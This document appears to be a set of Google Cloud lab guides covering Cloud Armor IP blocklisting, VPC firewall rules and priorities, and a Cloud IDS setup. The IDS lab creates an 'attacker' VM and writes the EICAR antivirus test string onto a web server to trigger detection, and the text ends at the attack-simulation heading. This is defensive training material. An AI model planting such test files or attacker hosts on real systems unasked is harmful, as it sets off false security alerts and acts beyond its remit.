**Note:** It might take a couple of minutes for the security policy to take affect. If you are able to access the backends, keep trying until you get the **404** Not Found error.

1. Try accessing the load balancer IP from your local browser. You should still be able to access it as we have only blocklisted the access-test VM.

Click *Check my progress* to verify the objective.

Create a security policy with Google Cloud Armor.



#### Task 4. View Google Cloud Armor logs

1. In the Console, from the **Navigation menu** > **View All Products**. Go to **Networking** section, click **Network Security** > **Cloud Armor policies**.
2. Click **blocklist-access-test**.
3. Click **Logs**.
4. Click **View policy logs** and go to the latest logs. If prompted, close the notification.
5. Locate a log with a **404** and expand the log entry.
6. Expand **httpRequest**.
7. The request should be from the **access-test** VM IP address.
8. Explore some of the other log entries.

#### Congratulations!

In this lab, you have done the following:

- Verified that the HTTP load balancer was deployed.
- Created a VM to test access to the HTTP load balancer.
- Used Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.



### Quiz

1. Which Google Cloud service provides defense against infrastructure and application Distributed Denial of Service (DDoS) attacks?

- Cloud CDN

- Cloud DNS

- Cloud Load Balancing

- **Google Cloud Armor**

Correct. Google Cloud Armor is specifically designed to protect against  DDoS attacks at both the infrastructure and application layers. It  offers features like: 

- Web Application Firewall (WAF) to filter malicious traffic
- Rate limiting to control traffic spikes
- DDoS attack detection and mitigation
- IP whitelisting and blacklisting

2. Which two of the following statements are true about Google Cloud Armor?

- Google Cloud Armor is not currently compatible with any third-party partner security products.

- **Google Cloud Armor enforces access control based on IPv4 and IPv6 addresses or CIDRs.**

- **Google Cloud Armor protection is delivered at the edge of Google’s network.**

- Google Cloud Armor is a ransomware defense service.

Correct. This is a key advantage of Cloud Armor. By filtering traffic at the edge, it can mitigate attacks before they reach your  infrastructure, reducing the load on your resources and ensuring better  protection.

Correct. This is a core feature of Cloud Armor. It allows you to create  rules that permit or deny traffic based on the source IP address or  range. This is useful for filtering out known bad actors or restricting  access to specific regions.



## Controlling Access to VPC Networks

### LAB - Configuring VPC Firewalls

#### Overview

In this lab, you investigate [Virtual Private Cloud (VPC)](https://cloud.google.com/vpc) networks and create firewall rules to allow and deny access to a network and instances.

You begin by creating an automatic VPC network, a custom VPC network, and some VPC instances in those networks. You verify that the default-allow-ssh firewall rule is working and then compare this to the user created custom network to verify no ingress is allowed without custom firewall rules.

After deleting the default network, you use firewall rule priorities,to allow both ingress and egress of network traffic to your VMs.

#### Objectives

In this lab, you will learn how to:

- Create an auto-mode network, a custom-mode network, and associated subnetworks.
- Investigate firewall rules in the default network and then delete the default network.
- Use features of firewall rules for more precise and flexible control of connections.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```



**Output:**

```
Credentialed accounts:
 - @.com (active)
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```



**Output:**

```
[core]
project = 
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

#### Task 1. Create VPC networks and instances

In this task, you create an automatic VPC network and custom VPC network, and some initial VPC instances in those networks.

1. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)) to open Cloud Shell. If prompted, click **Continue**.
2. To create the network *mynetwork* with auto subnets, run the following command:

```
gcloud compute networks create mynetwork --subnet-mode=auto
```



**Note:** When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.

You will now create a network with custom subnets. You can choose any private RFC 1918 CIDR block for the primary IP address range of the subnets.

1. To create the network *privatenet* with custom subnets, run the following command:

```
gcloud compute networks create privatenet \
--subnet-mode=custom
```



1. To create a custom subnet in the privatenet network, run the following command:

```
gcloud compute networks subnets create privatesubnet \
--network=privatenet --region=Region \
--range=10.0.0.0/24 --enable-private-ip-google-access
```



1. To create some instances to use later for testing in all networks, run these commands:

```
gcloud compute instances create default-vm-1 \
--machine-type e2-micro \
--zone=Zone 1 --network=default
```



```
gcloud compute instances create mynet-vm-1 \
--machine-type e2-micro \
--zone=Zone 1 --network=mynetwork
```



```
gcloud compute instances create mynet-vm-2 \
--machine-type e2-micro \
--zone=Zone 2 --network=mynetwork
```



```
gcloud compute instances create privatenet-bastion \
--machine-type e2-micro \
--zone=Zone  --subnet=privatesubnet --can-ip-forward
```



```
gcloud compute instances create privatenet-vm-1 \
--machine-type e2-micro \
--zone=Zone  --subnet=privatesubnet
```



Click *Check my progress* to verify the objective.

Create VPC networks and instances



#### Task 2. Investigate the default network

In this task, you explore the default network and verify that the default-allow-ssh firewall rule is working. Later, you delete the default-vm-1 instance and default network because you no longer need it.

Return to the Cloud Console and view the firewall rules.

1. On the **Navigation menu**, click **VPC network > Firewall**.

The following four default rules are created for the default network:

![Four default firewall ingress rules](https://cdn.qwiklabs.com/%2B3rX%2BBQoV4F%2Fs0b%2BSi9SndCb%2BjMo60W8vKASrh9dXL4%3D)

Remember, all networks also have the following 2 rules, which are not displayed in the console:

![Default deny all ingress and default deny all egress rules](https://cdn.qwiklabs.com/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D)

To check that the default-allow-ssh firewall rule is working, ssh into the default-vm-1 instance in the default network and test it.

1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
2. In the row for the **default-vm-1** instance, click **SSH**.

You should connect successfully via SSH to the instance because of the default-allow-ssh rule. You can ping `www.google.com` to test the egress connectivity. Press **Ctrl+C** to stop the ping.

##### Delete the default-vm-1 instance

Now delete the default-vm-1 instance because you no longer need it.

1. In the **Navigation menu**, click **Compute Engine > VM instances**, select the **default-vm-1** instance and then click **Delete**.
2. In the confirmation box, click **Delete**.

##### Delete the default network

**Note:** Because the default network allows relatively open access, we recommend that you delete it for production projects.

1. On the **Navigation menu**, click **VPC network > VPC networks** to display the list of VPC networks in the Cloud Console.
2. Click the **default** network to view the network details.
3. Click **Delete VPC Network**.
4. In the confirmation box, click **Delete**.
5. Wait for the network to be deleted and verify that the default network is no longer displayed on the VPC Networks page.

#### Task 3. Investigate the user-created networks

In this task, you explore the user-created networks to verify no ingress is allowed without custom firewall rules.

##### Verify that no ingress is allowed without custom firewall rules

Remember, all networks have the following 2 rules (which will not be displayed in the Console) to block all incoming traffic and allow all outgoing traffic. Unlike the default network, user-created networks do not have any other rules by default, so currently no inbound traffic is allowed.

![Default deny all ingress and default deny all egress rules](https://cdn.qwiklabs.com/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D)

1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
2. In the row for **mynet-vm-1** or **mynet-vm-2**, click **SSH**.

You should **NOT** be able to connect via SSH to the instances.

You will now try to SSH into an instance from the Cloud Shell.

1. Switch back to or reopen Cloud Shell.
2. To try to ssh into the **mynet-vm-2** instance, run the following command:

```
gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2
```



If prompted, type `Y` and press **Enter** twice to proceed.

We should **NOT** be able to connect via SSH to the instances. There is currently no inbound access allowed. Igonre the error message **ERROR: (gcloud.compute.ssh) [/usr/bin/ssh] exited with return code [255]**

#### Task 4. Create custom ingress firewall rules

In this task, you use Cloud Shell as your client host to test SSH connectivity to the instances. The external IP address of the Cloud Shell instance can be easily retrieved.

However, the IP address of your Cloud Shell instance can change if you close and reopen it, or if it is recycled due to inactivity. This should not be a problem during this lab. For a "real" project, you would allow the IP address of your SSH client host and there should not be a problem.

**Note:** As you just verified, the browser-based console SSH feature used to connect to VM instances does not currently work. If you want to allow that, you need a firewall rule that allows the source IP address. However, source IP addresses for browser-based SSH sessions are dynamically allocated by the Cloud Console and can vary from session to session.



For the feature to work, you must allow connections either from any IP address, or from Google's IP address range, which you can retrieve using public SPF records. Either of these options may pose unacceptable risks, depending on your requirements. Instead, you would allow the IP address of the SSH clients you are using to connect.

##### Allow SSH access from Cloud Shell

1. Switch back to or reopen Cloud Shell.
2. To retrieve the external IP address of the Cloud Shell instance, run the following commands:

```
ip=$(curl -s https://api.ipify.org)
echo "My External IP address is: $ip"
```



**Sample output** (your IP will be different):

```
My External IP address is: 35.229.72.135
```

1. To add a firewall rule that allows port 22 (SSH) traffic from the Cloud Shell IP address, run the following command:

```
gcloud compute firewall-rules create \
mynetwork-ingress-allow-ssh-from-cs \
--network mynetwork --action ALLOW --direction INGRESS \
--rules tcp:22 --source-ranges $ip --target-tags=lab-ssh
```



This firewall rule is also given a target tag of *lab-ssh*, which means it applies only to instances that are tagged with the lab-ssh tag.

1. To view the firewall rule in the Cloud Console, on the **Navigation menu**, click **VPC network > Firewall**.

It will look similar to the following, but your IP address will be different:

![Configuration for ingress lab-ssh firewall](https://cdn.qwiklabs.com/9uKhUJ%2FQAhtDY%2B5b5FXwBXuOImH%2F38MeUcSK7O6MzEk%3D)

This firewall rule will be applied only to instances tagged with *lab-ssh*. It is currently not being applied to any instances.

**Note:** You have just created and applied a firewall rule using a tag. One issue with tags is that they must be added to instances and could possibly be added or removed inadvertently. Firewall rules can also be applied to instances by the service account used. These rules will be applied automatically to all instances that use the specified service account.

1. To add the lab-ssh network tag to the **mynet-vm-2** and **mynet-vm-1** instances, run the following commands in Cloud Shell:

```
gcloud compute instances add-tags mynet-vm-2 \
    --zone Zone 2 \
    --tags lab-ssh
gcloud compute instances add-tags mynet-vm-1 \
    --zone Zone 1 \
    --tags lab-ssh
```



##### Stateful firewalls

In VPC networks, firewall rules are stateful. So for each initiated connection tracked by allow rules in one direction, the return traffic is automatically allowed, regardless of any rules.

1. To ssh into the **mynet-vm-2** instance, run the following command in Cloud Shell:

```
gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2
```



It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.

1. Type `exit` to log off the **mynet-vm-2** instance.
2. To ssh into the **mynet-vm-1** instance, run the following command in Cloud Shell:

```
 gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1
```



This connection should also succeed because the **mynet-vm-1** instance is in the same network, and the firewall rule you created is allowing access to all instances.

##### Allow all instances on the same network to communicate via ping

1. While still logged in to the **mynet-vm-1** instance, try pinging the **mynet-vm-2**instance with the command shown below. (Replace the *[PROJECT_ID]* with the PROJECT_ID for your lab exercise.)

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



The ping command will not succeed. Even though the **mynet-vm-1** and the **mynet-vm-2** instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.

1. Press **Ctrl+C** to stop ping if needed. Do not log out of the **mynet-vm-1** instance yet.
2. To open a new Cloud Shell window, click **Open a new tab** (**+**).
3. To add a firewall rule that allows ALL instances in the mynetwork VPC to ping each other, run the following command:

```
gcloud compute firewall-rules create \
mynetwork-ingress-allow-icmp-internal --network \
mynetwork --action ALLOW --direction INGRESS --rules icmp \
--source-ranges 10.128.0.0/9
```



**Note:** This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.

1. Switch back to the first Cloud Shell session that is connected to **mynet-vm-1** and run the ping again. This time it should work.

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



Notice that the hostname *mynet-vm-2* resolved to the internal IP address of the instance. The internal IP will start with *10.132.0* (for example, *10.132.0.2*). Google Cloud resolves internal hostnames for you.

1. Press **Ctrl+C** to stop ping.
2. You can also try pinging the internal IP address directly and that will also work. Press **Ctrl+C** to stop ping.
3. To locate the external IP address of **mynet-vm-2**, on the **Navigation menu**, click **Compute Engine > VM instances**.
4. Click on **mynet-vm-2**, locate and copy the external IP address of the instance.
5. From the Cloud Shell session that is connected to **mynet-vm-1**, try to ping the external IP address of the **mynet-vm-2** instance:

```
 ping 
```



This should **NOT** work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the *external* IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from *internal* IP addresses.

1. Press **Ctrl+C** to stop ping.

Click *Check my progress* to verify the objective.

Create custom ingress firewall rules



#### Task 5. Set the firewall rule priority

In this task, you set the firewall rule priority to deny ICMP traffic. You then verify that any traffic that does not match the rule priority is denied.

So far, all the rules created have been ingress allow rules, so the priority has not been important. Firewall rules can be both allow and deny, can specify ingress and egress, and have a priority from 0 to 65,535. If you do not set a priority, the default is 1,000. Rules are evaluated based on priority, starting from the lowest value. The first rule that matches gets applied.

1. In the first Cloud Shell session, verify that you are still connected to the **mynet-vm-1** instance. You can tell because the prompt will be: `qwiklabs@mynet-vm-1:~$`.

If not connected, use the following command to reconnect:

```
 gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1
```



1. Verify that you can still ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



1. Press **Ctrl+C** to stop ping.
2. Switch to your second Cloud Shell window (or open a new one).
3. In the second Cloud Shell, create a firewall ingress rule to deny ICMP traffic from any IP with a priority of 500:

```
gcloud compute firewall-rules create \
mynetwork-ingress-deny-icmp-all --network \
mynetwork --action DENY --direction INGRESS --rules icmp \
--priority 500
```



1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.

1. Press **Ctrl+C** to stop ping.

Now change the deny rule to a priority of 2,000.

1. In the second Cloud Shell, modify the firewall rule just created and change the priority to `2000`:

```
gcloud compute firewall-rules update \
mynetwork-ingress-deny-icmp-all \
--priority 2000
```



1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance again:

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.

1. Press **Ctrl+C** to stop ping.

#### Task 6. Configure egress firewall rules

In this task, you create an egress firewall rule and set the priority to 10,000. You then verify that both ingress and egress rule allow that traffic.

1. From the second Cloud Shell window, list all the current firewall rules:

```
gcloud compute firewall-rules list \
--filter="network:mynetwork"
```



Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.

Now try an egress rule.

1. Create a firewall egress rule to block ICMP traffic from any IP with a priority of `10000`:

```
gcloud compute firewall-rules create \
mynetwork-egress-deny-icmp-all --network \
mynetwork --action DENY --direction EGRESS --rules icmp \
--priority 10000
```



1. List all the current firewall rules again:

```
gcloud compute firewall-rules list \
--filter="network:mynetwork"
```



Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.

1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance and try to ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
```



**It should no longer work**. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.

1. Press **Ctrl+C** to stop ping.

Click *Check my progress* to verify the objective.

Create a firewall rule with priority and egress firewall rule.



#### Congratulations!

In this lab, you did the following:

- Created an auto-mode network, a custom-mode network, and associated subnetworks.
- Investigated firewall rules in the default network, and then deleted the default network.
- Used firewall rule features for more precise and flexible control of connections.



### LAB - Getting Started with Cloud IDS

#### Overview

In this lab, you deploy [Cloud Intrusion Detection System (Cloud IDS)](https://cloud.google.com/intrusion-detection-system), a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. You simulate multiple attacks and view the threat details in the Google Cloud console.

![Cloud IDS Infrastructure Diagram](https://cdn.qwiklabs.com/ENIYqVr9SB12IcIIqVmupO%2BfT7DCqkiZdHgtHJtYDuA%3D)

#### Objectives

In this lab, you learn how to perform the following tasks:

- Build out a Google Cloud networking environment as shown in the previous diagram.
- Create a Cloud IDS endpoint.
- Create two virtual machines using gcloud CLI commands.
- Create a Cloud IDS packet mirroring policy.
- Simulate attack traffic from a virtual machine.
- View threat details in the Cloud console and Cloud Logging.

#### Setup

#### Before you click the Start Lab button

**Note: Read these instructions.**



Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

#### What you need

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).
- Time to complete the lab.

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.

**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.

#### How to start your lab and sign in to the Console

1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.

   ![Credentials panel](https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D)

2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Choose an account** page.

   **Note:** Open the tabs in separate windows, side-by-side.

3. On the Choose an account page, click **Use Another Account**. The Sign in page opens.

   ![Choose an account dialog box with Use Another Account option highlighted ](https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D)

4. Paste the username that you copied from the Connection Details panel. Then copy and paste the password.

**Note:** You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).

1. Click through the subsequent pages:

- Accept the terms and conditions.
- Do not add recovery options or two-factor authentication (because this is a temporary account).
- Do not sign up for free trials.

After a few moments, the Cloud console opens in this tab.

**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left.![Cloud Console Menu](https://cdn.qwiklabs.com/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D)

#### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```



**Output:**

```
Credentialed accounts:
 - @.com (active)
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```



**Output:**

```
[core]
project = 
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

This lab will all be done using `gcloud` CLI commands inside Cloud Shell.

#### Task 1. Enable APIs

In this task you set the project ID variable and then enable the APIs required for the lab.

1. In Cloud Shell, to set the **Project_ID** environment variable, run the following command:

```
export PROJECT_ID=$(gcloud config get-value project | sed '2d')
```



1. Enable the Service Networking API:

```
gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID
```



If prompted to authorize the command, click **Authorize**.

1. Enable the Cloud IDS API:

```
gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID
```



1. Enable the Cloud Logging API:

```
gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID
```



Click *Check my progress* to verify the objective.

Enable APIs.



#### Task 2. Build the Google Cloud networking footprint

In this task, you create a Google Cloud VPC network and configure private services access.

Private services access is a private connection between your VPC network and a network owned by Google or a third party. Google or the third party, entities who are offering services, are also known as service producers.

The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.

1. In Cloud Shell, to create a VPC, run the following command:

```
gcloud compute networks create cloud-ids \
--subnet-mode=custom
```



If prompted to authorize the command, click **Authorize**.

1. Add a subnet to the VPC for mirrored traffic in us-east1:

```
gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1
```



1. Configure private services access:

```
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids
```



1. Create a private connection:

```
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID
```



Click *Check my progress* to verify the objective.

Create a VPC.



#### Task 3. Create a Cloud IDS endpoint

In this task you create a Cloud IDS endpoint in us-east1 with a severity set to *informational*.

Cloud IDS uses a resource known as an IDS endpoint, a zonal resource that can inspect traffic from any zone in its region. Each IDS endpoint receives mirrored traffic and performs threat detection analysis.

**Note:** The creation of the IDS endpoint takes approximately 20 minutes.

1. To create a Cloud IDS endpoint, in Cloud Shell, run the following command:

```
gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async
```



1. Verify that the Cloud IDS endpoint is initiated:

```
gcloud ids endpoints list --project=$PROJECT_ID
```



If the message **Would you like to enable and retry** appears, press **Y**.

The output should be similar to this:

Command Output

```
  ID: cloud-ids-east1
  LOCATION: us-east1-b
  SEVERITY: INFORMATIONAL
  STATE: CREATING
  NETWORK: cloud-ids
  TRAFFIC_LOGS:
```

Click *Check my progress* to verify the objective.

Create a Cloud IDS endpoint.



#### Task 4. Create Firewall rules and Cloud NAT

In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.

To enable standard http port (TCP 80) connections, and ICMP protocol connections to the server VM from all sources in the cloud-ids network, you define the *allow-http-icmp*rule.

To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.

You also configure Cloud Router and then configure Cloud NAT. As a prerequisite for Cloud NAT, a Cloud Router must first be configured in the same region. To provide internet access to VMs that don't have a public IP address, a Cloud NAT must be created in the same region. The VMs will be created without a public IP address to make sure that they are inaccessible *from* the internet. However, they will need access *to* the internet to download updates and files.

1. To create the allow-http-icmp rule, in Cloud Shell, run the following command:

```
gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server
```



1. Create the allow-iap-proxy rule:

```
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20
```



Click *Check my progress* to verify the objective.

Add firewall rules to the VPC.



1. To create a Cloud Router, run the following command:

```
gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids
```



1. To configure a Cloud NAT, run the following command:

```
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges
```



Click *Check my progress* to verify the objective.

Create a Cloud Router.



#### Task 5. Create two virtual machines

In this task, you create two virtual machines (VMs). The first virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.

You establish an SSH connection to your server via Identity-Aware Proxy (IAP), check the status of your web service server, create a benign malware file on the web server, and then add content to the file.

1. To create a virtual machine to be a server mirroring to Cloud IDS, in Cloud Shell, run the following command:

```
gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB
```



This command creates a Debian server in us-east1 and installs a simple web service.

1. Create a virtual machine to be a client sending attack traffic:

```
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB
```



This command prepares a Debian server in us-east1 to use as your client.

Click *Check my progress* to verify the objective.

Create a virtual machine.



##### Prepare your server

In this procedure, you validate your server and then create a benign malware payload for your client.

1. To establish an SSH connection to your server via IAP, run the following command:

```
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
```



This command will prompt you through a series of steps to create an ssh key and the required directories.

1. To agree to the directory creation prompt, type **Y**.
2. When prompted for a passphrase, to use a blank passphrase, press ENTER twice.

You are now in the shell of your server VM.

##### Confirm that the web service is running

In this procedure, you check the status of your web service server. You create a benign malware file on the web server and then add content to the file.

1. To check the status of your web service, run the following Linux command:

```
sudo systemctl status nginx
```



The output should be similar to this:

Command Output

```
 ● nginx.service - A high performance web server and a reverse proxy server
   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2021-05-25 18:01:49 UTC; 5h 24 min ago
   Docs: man:nginx(8)
   Main PID: 1347 (nginx)
   Tasks: 3 (limit: 4665)
   Memory: 4.5M
   CGroup: /system.slice/nginx.service
           ├─1347 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
           ├─1348 nginx: worker process
           └─1349 nginx: worker process

   May 25 18:01:49 server systemd[1]: Starting A high performance web server and a reverse proxy server...
   May 25 18:01:49 server systemd[1]: Started A high performance web server and a reverse proxy server.                       
```

1. Change directory to the web service:

```
cd /var/www/html/
```



1. Create a benign malware file on the web server. Run the following Linux command to create a text file:

```
sudo touch eicar.file
```



1. Add the following content to the newly created file:

```
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
```



1. Exit the server VM shell and return to Cloud Shell:

```
exit
```



#### Task 6. Create a Cloud IDS packet mirroring policy

In this task, you create a Cloud IDS packet mirroring policy. This policy determines what traffic is mirrored to the Cloud IDS. You will then attach this policy to the newly created Cloud IDS endpoint.

As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before you can proceed with this lab, the endpoint must be in an active/ready state.

1.To verify that your Cloud IDS endpoint is active, in Cloud Shell, run the following command to show the current state of the Cloud IDS endpoint:

```
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
```



The output should be similar to this:

Command Output

```
  STATE: READY
```

Continue to run this command every few minutes until the state shows *READY*.

1. Identify the Cloud IDS endpoint forwarding rule and confirm that the Cloud IDS endpoint state is *READY*:

```
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE
```



The output should be similar to this:

Command Output

```
  https://www.googleapis.com/compute/v1/projects/md975a7fa0a53145dp-tp/regions/us-east1/forwardingRules/ids-fr-cloud--xkkerutlagop6opm                         
```



1. Create and attach the packet mirroring policy:

```
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1
```



Click *Check my progress* to verify the objective.

Create and attach the packet mirroring policy.



1. Verify that the packet mirroring policy is created:

```
gcloud compute packet-mirrorings list
```



This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.

The output should be similar to this:

Command Output

```
  NAME: cloud-ids-packet-mirroring
  REGION: us-east1
  NETWORK: cloud-ids
  ENABLE: TRUE                        
```

#### Task 7. Simulate attack traffic

